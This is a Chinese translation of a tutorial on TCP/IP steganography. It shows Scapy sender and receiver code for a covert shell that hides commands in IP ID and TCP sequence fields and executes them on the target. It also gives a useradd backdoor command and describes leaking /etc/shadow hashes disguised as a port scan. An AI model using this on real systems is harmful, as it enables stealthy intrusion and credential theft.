> 原文链接: https://www.anquanke.com//post/id/85929 


# 【技术分享】基于TCP/IP协议栈的隐写术和隐蔽通道（part 1）


                                阅读量   
                                **125834**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：exploit-db.com
                                <br>原文地址：[https://www.exploit-db.com/docs/40891.pdf](https://www.exploit-db.com/docs/40891.pdf)

译文仅供参考，具体内容表达以及含义原文为准

****

[![](https://p3.ssl.qhimg.com/t019dd4a8d2cb25f223.jpg)](https://p3.ssl.qhimg.com/t019dd4a8d2cb25f223.jpg)

翻译：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**传送门**

[**【技术分享】基于TCP/IP协议栈的隐写术和隐蔽通道（part 2）**](http://bobao.360.cn/learning/detail/3755.html)

**<br>**

**前言**

**在本文中，我们将向读者详细介绍基于TCP/IP协议栈的隐写术和隐蔽通道技术。**

我知道这些都不是什么新鲜玩意，因为只要用google搜索关键词“Covert TCP”你就知道了！虽然这些技术都是“古董级”的（[**甚至有一个用C语言实现的PoC**](http://www-scf.usc.edu/~csci530l/downloads/covert_tcp.c)），但它们仍然有效，只不过由于某些原因，它们在渗透测试项目中很少用到。也许是因为这些方式不太为人所知，同时缺乏通用的实现所致吧。

然而，这种想法的确很诱人：我们可以使用未严格定义的协议报头中的值来泄漏大量数据，相应的工具可以从这里下载。小伙伴们，开始吧…… 

<br>

**IP标识字段 **

**万能的IPv4报头！ **

[![](https://p5.ssl.qhimg.com/t014cd1ec7afa560e32.png)](https://p5.ssl.qhimg.com/t014cd1ec7afa560e32.png)

**下面是RFC关于“标识”的“定义”： **

**标识：占16位**

**由发送方分配的帮助组装数据报的片段的标识值。**

这就是标识的定义，实际上就是一个数值——如果存在数据包拆分的话，这个值是有用的；否则的话，这个值就毫无意义了。最终的定义可能是:“只要不使用重复的值就行了”，所以IP实现采用了+1技术。每一个离开机器的新数据包，其ID都会比前一个数据包的ID大1。

然后问题就来了！nmap的空闲扫描就是利用（更像是使用）了这个实现的思想，从而达到了真正难以跟踪的端口扫描目的。它背后的运行机制非常有趣。这是一个邪恶的想法，来自臭名昭着的网络大师。

于是，不同的实现版本使用了不同的实现方式，并在IP标识字段中使用随机值。这正好给了我们梦寐以求的机会！

<br>

**随机值：梦想开始的地方！**

我们知道，我们期望的随机值可能会出现在某个字段中，那也没办法…一切都是允许的。

例如：IP标识字节的值可能是数据包中的“FU”，或“GG”，或2个零字节（ x00）。我们不能责怪任何人，这只是巧合而已…这真是太好了！

我们动手吧！（这里会大量用到Scapy和Python，请系好安全带）：

[![](https://p2.ssl.qhimg.com/t01a9186ded1bf68322.png)](https://p2.ssl.qhimg.com/t01a9186ded1bf68322.png)

在这里，我们将payload即"Hello！"（6字节）封装在3个IP数据包的标识字段（每个2个字节）中，从发送器传递给接收器。

之后，接收器将重新组合数据包的标识字段，从而复原这个字符串。

相当令人印象深刻！这种做法不仅简单，同时也是难以发现的。我指的是那些数据包的hexdumps： 

[![](https://p3.ssl.qhimg.com/t01e8dc9e5412965953.png)](https://p3.ssl.qhimg.com/t01e8dc9e5412965953.png)

如果仔细观察，您会发现每个数据包中的"Hello！"字节都是采用的Big Endian顺序（通过网络在Big Endian中传输的字节数）。它们不仅是可见的，并且也很容易被检测到，但是没人会在数据包报头中寻找数据泄漏隐患。那些数据包可以是虚假的HTTP请求，这样能够彻底误导分析师。

**问题：**



```
$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1956 Aug 2 16:27 /etc/shadow
```

这是一个值得泄漏的文件，但是传输这个文件需要使用978个数据包，假设我们仅在IP标识字段中封装数据…这里的关键字是“仅”… 

<br>

**寻找更大的带宽**

在寻找含有更多协议的定义没有占满或定义为随机数的字段的协议的时候，ISN是一个不错的候选者。

说得更精确些，就是TCP。

[![](https://p3.ssl.qhimg.com/t01cceae63813e486d9.png)](https://p3.ssl.qhimg.com/t01cceae63813e486d9.png)

初始序列号肯定不可能是完全随机的，同时对于每个新的连接来说，还必须是显著不同的（RFC 793，第27页 – 此处）。

长话短说，序列号字段计数在A-&gt; B连接中传送了多少字节。但是，如果所有的连接以初始序列号0为起点（因为它表示还没有传递字节），那么这个值很容易被坏人猜到。猜到这个值以后，他们就能将数据包注入到A-&gt; B连接中，篡改正在传送的内容。例如，更改从FTP或网页下载的.exe文件——看看，这是多么可怕的事情啊！ 

因此，ISN根据RFC的规定使用了一种定时算法，以便让序列号难以猜中。我们可以肯定地说，ISN具有有效的随机性。游戏开始… 

<br>

**4个字节？**

在TCP连接中，序列号不是随机的，实际上离随机性差得很远。它们的作用是对连接中各个方向上传输的字节进行计数。随机性取决于第一个（初始）序列号的取值。

所以，我们可以在连接尝试中获得4个字节的“带宽”。这只能用于每个潜在连接的第一个数据包。哈哈，聪明的读者一定想到了端口扫描。

所以，我们可以让一台PC（肉鸡）对我们进行“端口扫描”。尽管这一切看起来像是端口扫描，但实际上是在进行数据渗漏。太坏了！ 

开始下手:

哦，在此之前，我将在代码中使用下一行: 



```
grep -v '#' /usr/share/nmap/nmap-services | sort -r -k3 | awk '`{`print $2`}`' | cut -d/ -f1 | he
ad -$x
```

当我们从nmap端口使用频率文件获取X个最常见的端口，上面这一行特别有用。它可以与-top-ports选项一起使用。现在，我们要模拟nmap端口扫描… 

**见下图： **

[![](https://p5.ssl.qhimg.com/t0139eedec339c21ec6.png)](https://p5.ssl.qhimg.com/t0139eedec339c21ec6.png)

这里泄漏了什么？ 密码的哈希值！它只需要17个数据包就够了。

带有实际数据包的.pcap文件可以在这里找到。Wireshark也是不错的分析工具，读者可以尝试通过自己的方式来获取有效载荷。

（值得庆幸的是，scapy将默认的源端口设为20/ftp-data，当然，SANS504是端口扫描最引人入胜的端口，真是明智的做法…） 

<br>

**彻底颠覆你的思想 **

**渗漏就是LAME … **

我的意思是，来吧…要在机器上运行scapy来制作数据包或进行第2层嗅探，你必须拥有机器的root权限。所以，如果你已经获得了一台机器的root权限，那么工作的大头已经完成了，而获取数据只占工作中的小头。您需要远程命令执行。你需要#_ Shell提示符！ 

但是shell（bind / reverse / web）是可见的，并且很容易被检测到。所以，让我们打造一个隐蔽的Shell。

**优点**

由于没有使用连接，所以它能在OS 4层套接字中实现终极隐身。

IDS / IPS也别想捕获它，因为它们不会检测数据包报头。

防火墙和外围安全设备也记录不到有用的信息。对于没有权限捕获数据包的分析师眼中，一切与端口扫描无异。

**缺点**

不能通过（任何类型）代理工作，因为它们从头开始重新构建所有数据包。

它需要在受害者机器上运行一个程序。

它通常缺乏命令的响应（至少这个版本如此）。

**概念：**

我们要运行一个简单的命令，如下： 

```
useradd -p $(openssl passwd -1 covert_password) covert_user
```

这样就能在远程机器中创建具有密码的用户。

该命令必须悄悄地潜伏到目标机器上执行。

该命令必须被分割，以放入多个数据包。我们必须创建一个开关，通知侦听器哪个是最后一个数据包，因为不同的命令有不同的长度。

所以我们从数据包的6个字节的可用带宽中牺牲一个字节，将其用于开关。

此外，还有一个填充的概念。如果命令的长度除以5（单个数据包的新带宽）带有余数，则意味着最后一个数据包需要利用额外的字节来填充。这些字节称为填充，需要能够轻松删除或忽略。

<br>

**（scapy）代码**

**接收器代码**



```
from os import system
from struct import pack
payload = ''
while True :
packet = sniff (iface = 'lo', count = 1) [0]
packet_payload = ''.join( pack("&lt;HI", packet.id, packet.seq) )
payload += packet_payload[1:]
if packet_payload[0] == 'xff' :
continue
if packet_payload[0] == 'xdd' :
os.system(payload.replace('x00', ''))
print "Run command '%s'" % payload
payload = ''
```

这个有点长，不是吗？因为使用Python语言的话需要14行代码。让我们用自然语言试试： 

在无限循环中，我们取出看到的第一个数据包，然后重新组合已经拆分放入ID和序列号字段中的字符串我们将该字符串添加到有效载荷中。

如果我们看到字节 xff，那么很好，继续 #这行代码作为附加功能的句柄添加 

如果我们看到字节 xdd，这意味着我们得到的数据包是命令中的最后一个包。

我们使用system()在shell中运行命令

宣布我们的任务，让beta测试员开心一下。

清空有效负载字符串，使之为下一个命令做好准备。

从头开始循环 

看，只有10行。因为自然语言不需要includes和imports语句。

**发送器代码 **



```
from struct import unpack
def chunker(payload, chunk_size = 5) :
packetN = (len(payload) / chunk_size)
if len(payload) % chunk_size &gt; 0 :
packetN + 1
payload += 'x00' * ( chunk_size - (len(payload) % chunk_size) )
packets = []
payload_chuncks = [payload[x:x + chunk_size] for x in xrange(0, len( payload ), chunk_size
) ]
for i in range( len(payload_chuncks) - 1) :
ip_id, tcp_isn = unpack("&lt;HI", 'xff' + payload_chuncks[i])
packet = IP( id = ip_id )/TCP( seq = tcp_isn )
packets.append( packet )
ip_id, tcp_isn = unpack("&lt;HI", 'xdd' + payload_chuncks[-1])
packet = IP( id = ip_id )/TCP( seq = tcp_isn )
packets.append( packet )
return packets
while True :
payload = raw_input("$&gt; ")
if not payload :
continue
packets = chunker(payload)
send(packets, inter = 0.05)
```

这是发送器。您可以看到代码仅适用于localhost，并且有很多限制。我现在只是编写一个隐蔽Shell的概念证明代码，完整的代码将在第二篇中提供… 

<br>

**动起来，动起来… **

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c062ec38486ab386.png)

发送器（左图），接收器（右上图），证明命令已经执行（右下图）

<br>

**分析师看到的一幕**

[![](https://p3.ssl.qhimg.com/t0129f9f558a76e0da0.png)](https://p3.ssl.qhimg.com/t0129f9f558a76e0da0.png)

“嗯… 在这个主机上的所有数据包的ID和序列号显然不是随机的…我不知道这里发生了什么…”

未完待续… 

<br>



**传送门**

[**【技术分享】基于TCP/IP协议栈的隐写术和隐蔽通道（part 2）**](http://bobao.360.cn/learning/detail/3755.html)

<br>
